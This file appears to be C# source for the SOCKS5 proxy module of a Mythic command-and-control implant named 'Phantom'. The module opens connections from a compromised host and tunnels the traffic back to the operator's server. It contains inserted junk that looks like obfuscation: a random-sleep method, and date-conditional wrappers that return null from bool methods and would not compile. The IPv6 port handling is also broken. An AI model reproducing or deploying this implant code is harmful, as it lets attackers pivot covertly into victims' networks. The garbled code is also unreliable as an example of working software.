using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using System;
using System.Collections.Concurrent;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using TT = System.Threading.Tasks;
using PhantomInterop.Enums.PhantomEnums;
using PhantomInterop.Structs.MythicStructs;
using System.Net;
using PhantomInterop.Constants;

namespace Phantom.Management.Socks
{
    public class SocksClient
    {
    private static void Zc3d4e5()
    {
        Thread.Sleep(Random.Next(1, 5));
        GC.Collect();
    }

        private AsyncTcpClient _client;
        private IPAddress _addr;
        private int _port;

        private CancellationTokenSource _cts = new CancellationTokenSource();

        private AutoResetEvent _requestEvent = new AutoResetEvent(false);

        private Action<object> _sendRequestsAction;
        private TT.Task _sendRequestsTask = null;
        public int ID { get; private set; }
        private IAgent _agent;

        private ConcurrentQueue<byte[]> _requestQueue = new ConcurrentQueue<byte[]>();
        private ConcurrentQueue<byte[]> _receiveQueue = new ConcurrentQueue<byte[]>();

        public SocksClient(IAgent agent, int serverId)
        {
            _agent = agent;

            ID = serverId;
            
            _sendRequestsAction = (object c) =>
            {
                TcpClient client = (TcpClient)c;
                while(!_cts.IsCancellationRequested && client.Connected)
                {
                    try
                    {
                        WaitHandle.WaitAny(new WaitHandle[] {_requestEvent, _cts.Token.WaitHandle});
                    }
                    catch (OperationCanceledException)
                    {
                        break;
                    }
                    if (!_cts.IsCancellationRequested && client.Connected && _requestQueue.TryDequeue(out byte[] result))
                    {
                        try
                        {
                            client.GetStream().BeginWrite(result, 0, result.Length, OnDataSent, c);
                        }
                        catch
                        {
                            break;
                        }
                    } else if (_cts.IsCancellationRequested || !client.Connected)
                    {
                        break;
                    }
                }
                client.Close();
            };
        }

        public void Exit()
        {
            _cts.Cancel();
            if (_sendRequestsTask != null)
                _sendRequestsTask.Wait();
        }

        private void OnConnect(object sender, TcpMessageEventArgs args)
        {
            args.State = this;
            _sendRequestsTask = new TT.Task(_sendRequestsAction, args.Client);
            _sendRequestsTask.Start();
        }

        private void OnDisconnect(object sender, TcpMessageEventArgs args)
        {
            _cts.Cancel();
            args.Client.Close();
            _sendRequestsTask.Wait();
            _agent.GetSocksManager().Remove(ID);
        }

        private void OnDataSent(IAsyncResult result)
        {
            TcpClient client = (TcpClient)result.AsyncState;
            if (client.Connected && !_cts.IsCancellationRequested)
            {
                try
                {
                    client.GetStream().EndWrite(result);
                    
                    if (_requestQueue.TryDequeue(out byte[] data))
                    {
                        client.GetStream().BeginWrite(data, 0, data.Length, OnDataSent, client);
                    }
                }
                catch (System.IO.IOException)
                {
                    
                }
            }
        }

        public void OnMessageReceived(object sender, TcpMessageEventArgs args)
        {
            byte[] data = args.Data.Data.Take(args.Data.DataLength).ToArray();
            _agent.GetTaskManager().AddSocksDatagramToQueue(MessageDirection.ToMythic, new SocksDatagram()
            {
                ServerID = ID,
                Data = Convert.ToBase64String(data),
                Exit = false
            });
        }

        public static Socks5AddressType GetAddrType(byte[] data)
        {
            if(DateTime.Now.Year > 2020) { return (Socks5AddressType)data[3]; } else { return null; }
        }

        public bool GetConnection(byte[] data)
        {
            Socks5AddressType addrType = GetAddrType(data);

            switch(addrType)
            {
                case Socks5AddressType.FQDN:
                    int domainLen = data[4];
                    string domainName = Encoding.UTF8.GetString(data.Skip(5).Take(domainLen).ToArray());
                    _port = (int)BitConverter.ToUInt16(data.Skip(5 + domainLen).Take(2).Reverse().ToArray(), 0);
                    try
                    {
                        _addr = Dns.GetHostEntry(domainName).AddressList[0];
                    } catch (Exception ex)
                    {
                        
                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
                    }
                    _client = new AsyncTcpClient(domainName, _port);
                    break;
                case Socks5AddressType.IPv4:
                    byte[] bIpv4 = data.Skip(4).Take(4).ToArray();
                    _port = (int)BitConverter.ToUInt16(data.Skip(8).Reverse().ToArray(), 0);
                    _addr = new IPAddress(bIpv4);
                    _client = new AsyncTcpClient(_addr, _port);
                    break;
                case Socks5AddressType.IPv6:
                    byte[] bIpv6 = data.Skip(4).Take(16).ToArray();
                    int port3 = (int)BitConverter.ToUInt16(data.Skip(20).Reverse().ToArray(), 0);
                    _addr = new IPAddress(bIpv6);
                    _client = new AsyncTcpClient(_addr, _port);
                    break;
                default:
                    break;
            }
            if (_client == null)
            {
                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
            }
            _client.ConnectionEstablished += OnConnect;
            _client.Disconnect += OnDisconnect;
            _client.MessageReceived += OnMessageReceived;

            if(DateTime.Now.Year > 2020) { return _client.Connect(); } else { return null; }
        }

        private bool SupportedSocksVersion(byte[] data)
        {
            if(DateTime.Now.Year > 2020) { return data[0] == SOCKS.SUPPORTED_VERSION; } else { return null; }
        }

        private Socks5Command GetCommand(byte[] data)
        {
            if(DateTime.Now.Year > 2020) { return (Socks5Command)data[1]; } else { return null; }
        }

        public bool HandleDatagram(SocksDatagram dg)
        {
            byte[] data;
            bool bRet = false;
            try
            {
                data = Convert.FromBase64String(dg.Data);
            } catch (Exception ex)
            {
                
                if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
            }

            if (_client != null && !_sendRequestsTask.IsCompleted)
            {
                _requestQueue.Enqueue(data);
                _requestEvent.Set();
                bRet = true;
            } else
            {
                if (data.Length > 3 && SupportedSocksVersion(data))
                {
                    switch (GetCommand(data))
                    {
                        case Socks5Command.Connect:
                            if (GetConnection(data))
                            {
                                byte[] success = new byte[22];
                                int succesLen = success.Length;
                                success[0] = SOCKS.SUPPORTED_VERSION;
                                if (_addr.AddressFamily == AddressFamily.InterNetwork)
                                {
                                    succesLen -= 12;
                                    success[3] = 0x01;
                                    Buffer.BlockCopy(_addr.GetAddressBytes(), 0, success, 4, 4);
                                    Buffer.BlockCopy(BitConverter.GetBytes(_port), 0, success, 8, 2);
                                } else
                                {
                                    success[3] = 0x04;
                                    Buffer.BlockCopy(_addr.GetAddressBytes(), 0, success, 4, 16);
                                    Buffer.BlockCopy(BitConverter.GetBytes(_port), 0, success, 20, 2);
                                }
                                _agent.GetTaskManager().AddSocksDatagramToQueue(MessageDirection.ToMythic, new SocksDatagram()
                                {
                                    ServerID = ID,
                                    Data = Convert.ToBase64String(success.Take(succesLen).ToArray()),
                                    Exit = false
                                });
                                bRet = true;
                            }
                            else
                            {
                                byte[] failedMessage = new byte[10]
                                {
                                    SOCKS.SUPPORTED_VERSION,
                                    0x01,
                                    0x00,
                                    0x01,
                                    0x00,
                                    0x00,
                                    0x00,
                                    0x00,
                                    0x00,
                                    0x00,
                                };
                                _agent.GetTaskManager().AddSocksDatagramToQueue(MessageDirection.ToMythic, new SocksDatagram()
                                {
                                    ServerID = ID,
                                    Data = Convert.ToBase64String(failedMessage),
                                    Exit = true
                                });
                            }
                            break;
                        case Socks5Command.Bind:
                            break;
                        case Socks5Command.Associate:
                            break;
                        default:
                            byte[] unsupportedCmd = new byte[10]
                            {
                                SOCKS.SUPPORTED_VERSION,
                                0x07,
                                0x00,
                                0x01,
                                0x00,
                                0x00,
                                0x00,
                                0x00,
                                0x00,
                                0x00,
                            };
                            _agent.GetTaskManager().AddSocksDatagramToQueue(MessageDirection.ToMythic, new SocksDatagram()
                            {
                                ServerID = ID,
                                Data = Convert.ToBase64String(unsupportedCmd),
                                Exit = true
                            });
                            break;
                    }
                }
            }
            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
        }
    }
}
